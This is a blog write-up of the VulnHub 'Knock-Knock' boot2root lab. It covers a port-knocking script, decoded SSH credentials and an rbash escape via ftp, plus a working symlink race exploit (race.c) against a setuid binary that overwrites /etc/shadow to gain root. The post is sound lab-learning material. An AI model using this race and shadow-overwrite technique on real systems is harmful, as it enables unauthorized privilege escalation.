---
layout: post
title: "Knock-Knock Hacking Challenge"
date: 2014-10-15 21:36:57 -0400
comments: true
categories: boot2root
---

For the last few weeks I had immersed myself in several CTFs with team VulnHub. It was a nice change to return to boot2roots after tackling small and difficult challenges. This time round, it's Knock-Knock by [zer0w1re](http://twitter.com/@zerowire). Much like other boot2roots, the goal is to get root, and find the flag. As always, head over to [VulnHub](http://vulnhub.com/entry/knock-knock-11,105/) to download it and have a go. 

<!--more--> 

### Port knocking

Using netdiscover, I identified the target's IP address as 172.16.171.134. I started with the usual enumeration phase by scanning for open ports. Interestingly, only one port was found to be open:

```
root@kali ~/knock
# nmap -p- 172.16.171.134 

Starting Nmap 6.47 ( http://nmap.org ) at 2014-10-15 21:45 EDT
Nmap scan report for 172.16.171.134
Host is up (0.00020s latency).
Not shown: 65534 filtered ports
PORT     STATE SERVICE
1337/tcp open  waste
MAC Address: 00:0C:29:F1:E1:0B (VMware)

Nmap done: 1 IP address (1 host up) scanned in 163.46 seconds
```

I connected to port 1337 and the service returned printed out three different numbers before closing the connection. Each time I reconnected, I got three different numbers. 

```
root@kali ~/knock
# nc 172.16.171.134 1337
[12668, 64082, 30382]

root@kali ~/knock
# nc 172.16.171.134 1337
[27008, 20670, 52508]

root@kali ~/knock
# nc 172.16.171.134 1337
[29043, 44730, 61426]
```

Given the name of the VM, I assumed that a port knocker was installed on the server and these were the ports I needed to hit in order before more ports would be available to me. I wrote the following python script to do the job: 

```python
#!/usr/bin/env python
from socket import *

ip = "172.16.171.134"

s = socket(AF_INET, SOCK_STREAM)
s.connect((ip, 1337))

r = eval(s.recv(1024))
print "received:", r

for p in r: 
    try:
        print "knocking on port:", p
        s2 = socket(AF_INET, SOCK_STREAM)
        s2.connect((ip, p))
        print s2.recv(1024)
    except:
        pass
print "done"
```

With the script done, I ran it and it connected to each port in the order that the service returned to me:

```text
root@kali ~/knock
# ./knock.py 
received: [28407, 62949, 3170]
knocking on port: 28407
knocking on port: 62949
knocking on port: 3170
done
```

I ran nmap again and found that ports 22 and 80 were now open! I later found out after reading [barrebas's](http://barrebas.github.io/blog/2014/10/14/knock-knock-knocking-on-roots-door/) walkthrough that the ports returned by the service were actually randomized. I got lucky on the first try, which was probably a good thing, else I might have gone mad. 

```
root@kali ~/knock
# nmap -p- 172.16.171.134

Starting Nmap 6.47 ( http://nmap.org ) at 2014-10-15 22:30 EDT
Nmap scan report for 172.16.171.134
Host is up (0.00021s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1337/tcp open  waste
MAC Address: 00:0C:29:F1:E1:0B (VMware)

Nmap done: 1 IP address (1 host up) scanned in 161.64 seconds
```

### Getting a shell

Running nikto and dirbuster on port 80 returned nothing useful, so I visited the website where I was greeted with the following image: 

![](/images/2014-10-15/01.png)

A hint "Gotta look harder" led me to look at the source code for the webpage, but I found nothing. I downloaded the image and checked the metadata, but found nothing still. Finally, I just ran strings on it and was rewarded with another clue:

```
root@kali ~/knock
# strings knockknock.jpg
JFIF
Ducky
http://ns.adobe.com/xap/1.0/
<?xpacket begin="
" id="W5M0MpCehiHzreSzNTczkc9d"?>
.
.
.
*M1W
tR)O
MO:/?
qW|U
\+\U
Login Credentials
abfnW
sax2Cw9Ow
```

The last three lines reveal potential login credentials. Now that port 22 was open, I assumed I could use these to login to the server via SSH. Of course, it wasn't quite that easy. Trying the username abfnW with password sax2Cw9Oc failed miserably. It occured to me that perhaps the credentials were encrypted. My first assumption was that a substitution cipher of some sort must have been used, so I tried some common ones. The winner was ROT13. Running abfnW through [ROT13.com](http://www.rot13.com) returned nosaJ, which is Jason backwards! I ran the password through ROT13 as well and got fnk2Pj9Bj. Assuming that the username was jason, it made sense that the password must also be reversed to jB9jP2knf 

```
root@kali ~/knock
# ssh jason@172.16.171.134
The authenticity of host '172.16.171.134 (172.16.171.134)' can't be established.
ECDSA key fingerprint is af:79:f1:28:f4:7f:5a:d7:c4:31:9b:d9:b1:cc:05:f4.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.16.171.134' (ECDSA) to the list of known hosts.
jason@172.16.171.134's password: 
Linux knockknock 3.2.0-4-486 #1 Debian 3.2.60-1+deb7u3 i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Mon Oct  6 12:33:37 2014 from 192.168.56.202
jason@knockknock:~$
```

Hooray a shell! Well sort of. As it turns out, the default shell for jason is rbash, so I was restricted with what I could do. To get around this, I launched /bin/bash from ftp and successfully broke out of rbash:

```
son@knockknock:~$ cd /
-rbash: cd: restricted
jason@knockknock:~$ ftp
ftp> !/bin/bash
jason@knockknock:~$ cd /
jason@knockknock:/$ pwd
/
jason@knockknock:/$ 
```

### Racing for a root shell

In jason's home directory was a program called tfc that was setuid root. When run without any arguments, it printed a banner and usage message: 

```
jason@knockknock:~$ ./tfc 
_______________________________  
\__    ___/\_   _____/\_   ___ \ 
  |    |    |    __)  /    \  \/ 
  |    |    |     \   \     \____
  |____|    \___  /    \______  /
                \/            \/ 

    Tiny File Crypter - 1.0

Usage: ./tfc <filein.tfc> <fileout.tfc>
jason@knockknock:~$ 
```

So it takes two arguments, an input file, and an output file. Based on the name of the program, "Tiny File Crypter", it was safe to assume that it would encrypt the contents of the input file and save the results into the output file. A simple test was in order: 

```
jason@knockknock:~$ echo "hello world" > in.txt
jason@knockknock:~$ ./tfc in.txt out.txt
>> Filenames need a .tfc extension
```

The program complained that the files needed to end with a .tfc extension. So I renamed the files and tried again:

```
jason@knockknock:~$ mv in.txt in.tfc
jason@knockknock:~$ ./tfc in.tfc out.tfc
>> File crypted, goodbye!
jason@knockknock:~$ xxd -g1 out.tfc 
0000000: f7 d4 76 86 73 96 9d 6d 35 bd db 2f              ..v.s..m5../
jason@knockknock:~$ 
```

out.tfc contained the encrypted contents of in.tfc. But what happened if I used out.tfc as the input file? 

```
jason@knockknock:~$ ./tfc out.tfc out-2.tfc
>> File crypted, goodbye!
jason@knockknock:~$ xxd -g1 out-2.tfc 
0000000: 68 65 6c 6c 6f 20 77 6f 72 6c 64 0a              hello world.
jason@knockknock:~$ 
```

The file gets decrypted! Perhaps this was a simple XOR encryption being done on the input file. Since the binary had setuid root permissions, I knew I could use it to write to anywhere on the filesystem. The problem was that the output file needed to end with a .tfc extension. What about symbolic links? I tried creating a symbolic link to /etc/motd and attempting to overwrite it:

```
jason@knockknock:~$ ln -sf /etc/motd out.tfc 
jason@knockknock:~$ ./tfc in.tfc out.tfc 
>> No symbolic links!
jason@knockknock:~$ 
```

Nope. It was time to examine this binary a little more closely. I loaded it up in Hopper and had a look at the pseudocode for the main() function:

```c
int main(int arg0, int arg1) {
    esp = (esp & 0xfffffff0) - 0x10;
    if (arg_0 != 0x3) {
            banner(STK-1);
    }
    else {
            if (cryptFile(STK33, *(arg_4 + 0x4), *(arg_4 + 0x8)) != 0x0) {
                    puts(">> File crypted, goodbye!");
            }
    }
    return 0x0;
}
```

main() calls a function cryptFile(), which does the following: 

```c
int cryptFile(int arg0, int arg1, int arg2) {
    if ((strrchr(arg_0, 0x2e) != 0x0) && (strrchr(arg_4, 0x2e) != 0x0)) goto loc_8048733;
    goto loc_804871d;

loc_8048733:
    if ((strcmp(strrchr(arg_0, 0x2e) + 0x1, 0x8048adb) == 0x0) && (strcmp(strrchr(arg_4, 0x2e) + 0x1, 0x8048adb) == 0x0)) goto loc_804879d;
    goto loc_8048787;

loc_804879d:
    __lstat(arg_0, var_1070);
    if ((var_1060 & 0xf000) != 0xa000) goto loc_80487da;
    goto loc_80487c4;

loc_80487da:
    __lstat(arg_4, var_1070);
    if ((var_1060 & 0xf000) != 0xa000) goto loc_8048817;
    goto loc_8048801;

loc_8048817:
    var_C = open(arg_0, 0x0);
    if (var_C != 0xffffffff) goto loc_8048849;
    goto loc_8048833;

loc_8048849:
    stat(arg_0, var_1070);
    var_10 = open(arg_4, 0x41, 0x1a4);
    if (var_10 != 0xffffffff) goto loc_80488de;
    goto loc_8048882;

loc_80488de:

loc_80488df:
    var_14 = read(var_C, var_1018, var_1044);
    if (var_14 > 0x0) goto loc_8048898;
    goto loc_8048907;

loc_8048898:
    xcrypt(var_1018, var_1044);
    var_18 = write(var_10, var_1018, var_14);
    if (var_18 == var_14) goto loc_80488df;
    eax = 0x0;

loc_8048922:
    return eax;

loc_8048907:
    close(var_C);
    close(var_10);
    eax = 0x1;
    goto loc_8048922;

loc_8048882:
    puts(">> Failed to create the output file");
    eax = 0x0;
    goto loc_8048922;

loc_8048833:
    puts(">> Failed to open input file");
    eax = 0x0;
    goto loc_8048922;

loc_8048801:
    puts(">> No symbolic links!");
    eax = 0x0;
    goto loc_8048922;

loc_80487c4:
    puts(">> No symbolic links!");
    eax = 0x0;
    goto loc_8048922;

loc_8048787:
    puts(">> Filenames need a .tfc extension");
    eax = 0x0;
    goto loc_8048922;

loc_804871d:
    puts(">> Filenames need a .tfc extension");
    eax = 0x0;
    goto loc_8048922;
}
```

Hopper's representation of the pseudocode here looks more like spaghetti code, but it generally boiled down to the following:  

```c
// check if input file ends with "tfc"
s = strrchr(infile, ".")
if (strmcp(s, "tfc") != 0) {
    printf("Filenames need a .tfc extension\n"); 
    exit;
}

// check if output file ends with "tfc"
s = strrchr(outfile, ".")
if (strmcp(s, "tfc") != 0) {
    printf("Filenames need a .tfc extension\n"); 
    exit;
}

// check if input file is a symbolic link
struct stat buf;
lstat(infile, &buf); 
if ((buf1.st_mode & S_IFMT) == S_IFLNK) {
    printf("No symbolic links!\n"); 
    exit;
}

// check if output file is a symbolic link
struct stat sb1;
lstat(output, &sb1); 
if ((buf1.st_mode & S_IFMT) == S_IFLNK) {
    printf("No symbolic links!\n"); 
    exit;
}

// open input file for reading
if (open(infile, O_RDONLY) < 0) {
    printf("Failed to open input file\n"); 
    exit; 
}

// run stat on input file
struct stat sb2;
stat(infile, &sb2);

// open output file for writing
if (open(outfile, O_CREAT|O_WRONLY, 0644) < 0) {
    printf("Failed to open output file\n");
    exit;
}

// do the encryption by calling xcrypt()
char buf[n];
while (read(infile, buf, m)) {
    xcrypt(buf, m); 
    write(outfile, buf, m); 
}
```

There's actually a time of check to time of use bug in this block of code with regards to the time the checks are performed on the output file, and the time it's opened. Two checks are performed on the output file. The first is to see if it has a ".tfc" extension. However this check is actually just applied to the second argument to tfc since the output file doesn't even have to exist at this point

The second check is to see if the output file is a symbolic link, in the event that it does exist. If it's a symbolic link, then the program terminates. This check is done using lstat(). At this point, if both checks pass, then the program opens the input file for reading, calls stat() on the input file, and finally opens the output file for writing. 

Assuming I specify the output file as out.tfc, then in between the call to lstat("out.tfc") and open("out.tfc"), there is a small window where I can create a symbolic link out.tfc that points to an arbitrary file on the filesystem. 

```c
    // check if output file is a symbolic link
    struct stat sb1;
    lstat(output, &sb1); 
    if ((buf1.st_mode & S_IFMT) == S_IFLNK) {
        printf("No symbolic links!\n"); 
        exit;
    }



    /*
     * At this point I can do:
     * rm -f out.tfc
     * ln -sf /etc/motd out.tfc
     *
     * If I'm lucky, the following call to open will 
     * open /etc/motd and write to it
     */ 



    // open input file for reading
    if (open(infile, O_RDONLY) < 0) {
        printf("Failed to open input file\n"); 
        exit; 
    }

    // run stat on input file
    struct stat sb2;
    stat(infile, sb2);

    // open output file for writing
    if (open(outfile, O_CREAT|O_WRONLY, 0644) < 0) {
        printf("Failed to open output file\n");
        exit;
    }
```

Theory was fine and all, but would it work? To test it out, I created the following C program which would run a loop and continously delete any existing out.tfc file and create a symbolic link out.tfc pointing to /etc/motd. I chose /etc/motd because it was harmless if overwritten, and I had read access to it so I could see if my exploit worked. 

```c
// race.c   - compile with: gcc -o race race.c
#include <unistd.h>
int main(int argc, char *argv[]) {
    while (1) {
        unlink("/home/jason/out.tfc"); 
        symlink("/etc/motd", "/home/jason/out.tfc");
    }  
    return 0; 
}
```

Before running this program, I took a look at the contents of /etc/motd:

```text
jason@knockknock:~$ cat /etc/motd

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
```

I executed the program, so it was now continously deleting out.tfc and creating a symbolic link to it pointing to /etc/motd. In another terminal, I logged back into the server and changed the contents of in.tfc into something a tad bit longer, and executed tfc:

```
jason@knockknock:~$ echo "VROOM VROOM VROOM VROOM" > in.tfc 
jason@knockknock:~$ ./tfc in.tfc out.tfc 
>> No symbolic links!
```

First try didn't work, but that's why it's called a race condition. Better luck in the second try perhaps:

```
jason@knockknock:~$ ./tfc in.tfc out.tfc 
>> File crypted, goodbye!
jason@knockknock:~$ cat /etc/motd 
��U�Q����{�F%�V|zi�ith the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
jason@knockknock:~$ 
```

It worked! /etc/motd had been modified. Writing encrypted text into /etc/motd isn't particularly useful, but recall that passing the encrypted file as the input file to tfc will decrypt it. This means I can write the non-encrypted content into any file of my choosing. To get root, I decided to overwrite /etc/shadow.

/etc/shadow usually contains the entry for the root user on the first line. The plan was to use the root entry in my machine's /etc/shadow and use it to overwrite the one in the target's /etc/shadow. First, I changed the password for the root user on my machine to letmein

```
root@kali ~
# passwd
Enter new UNIX password: 
Retype new UNIX password: 
passwd: password updated successfully

root@kali ~
# head -1 /etc/shadow
root:$6$.WE9h/iH$av2inUwf3wz7aKz5w29PLPhL0qebUpnERqUiw7YA75Pn45bvlX4fb8FArmddCgoF87gqX8PyyMOg6toVsCffi0:16359:0:99999:7:::
```

I copied the updated root entry and padded it with some newlines, and saved it into in.tfc on the target and encrypted it, saving the output file as in2.tfc. The reason I padded it with new lines was because I wasn't sure how long root's entry was in /etc/shadow on the target. In my initial test with /etc/motd, it didn't blow the file away completely, but instead started writing to it from the beginning. By providing newlines, I ensured that I wouldn't end up with a corrupted entry. 

```
jason@knockknock:~$ printf 'root:$6$.WE9h/iH$av2inUwf3wz7aKz5w29PLPhL0qebUpnERqUiw7YA75Pn45bvlX4fb8FArmddCgoF87gqX8PyyMOg6toVsCffi0:16359:0:99999:7:::\n\n\n\n' > in.tfc
jason@knockknock:~$ 
jason@knockknock:~$ ./tfc in.tfc in2.tfc
>> File crypted, goodbye!
```

I updated race.c to create a symbolic link to /etc/shadow instead of /etc/motd, and then I recompiled it and executed it. Now for the magic! There was no way to read the contents of /etc/shadow to see if the race condition was exploited, so the only way to test was to try to su to root and provide my password letmein. If it worked, then I'd have a root shell. 

```
jason@knockknock:~$ ./tfc in2.tfc out.tfc 
>> File crypted, goodbye!
jason@knockknock:~$ su - 
Password: 
su: Authentication failure
jason@knockknock:~$ ./tfc in2.tfc out.tfc 
>> No symbolic links!
jason@knockknock:~$ ./tfc in2.tfc out.tfc 
>> File crypted, goodbye!
jason@knockknock:~$ su - 
Password: 
su: Authentication failure
jason@knockknock:~$ ./tfc in2.tfc out.tfc 
>> File crypted, goodbye!
jason@knockknock:~$ su - 
Password: 
root@knockknock:~# id
uid=0(root) gid=0(root) groups=0(root)
root@knockknock:~# 
```

It took several tries but eventually I was able to exploit the race condition and overwrite /etc/shadow with my own root entry, thereby allowing me to login as root! 


### Flag. Captured. 

From here on it was a matter of heading over to /root and looking for the flag. Unlike other boot2roots, the flag itself was in /root/the_flag_is_in_here/ and was called qQcmDWKM5a6a3wyT.txt. Reading the contents of the flag showed: 

```
root@knockknock:~# cat /root/the_flag_is_in_here/qQcmDWKM5a6a3wyT.txt 
 __                         __              __                         __      ____ 
 |  | __ ____   ____   ____ |  | __         |  | __ ____   ____   ____ |  | __ /_   |
 |  |/ //    \ /  _ \_/ ___\|  |/ /  ______ |  |/ //    \ /  _ \_/ ___\|  |/ /  |   |
 |    <|   |  (  <_> )  \___|    <  /_____/ |    <|   |  (  <_> )  \___|    <   |   |
 |__|_ \___|  /\____/ \___  >__|_ \         |__|_ \___|  /\____/ \___  >__|_ \  |___|
      \/    \/            \/     \/              \/    \/            \/     \/       

      Hooray you got the flag!

      Hope you had as much fun r00ting this as I did making it!

      Feel free to hit me up in #vulnhub @ zer0w1re

      Gotta give a big shout out to c0ne, who helpped to make the tfc binary challenge,
      as well as rasta_mouse, and recrudesce for helping to find bugs and test the VM :)

      root password is "qVx4UJ*zcUdc9#3C$Q", but you should already have a shell, right? ;)
```

After reading other writeups I realized that I had solved it in a completely different way from the others. Apparently tfc is vulnerable to a buffer overflow, but I never got around to that. Once I saw the time of check to time of use bug, I knew I could leverage it to get my root shell.

Overall a fun and challenging boot2root! Thanks to zer0w1re for making it, and for [VulnHub](http://www.vulnhub.com) for hosting it!
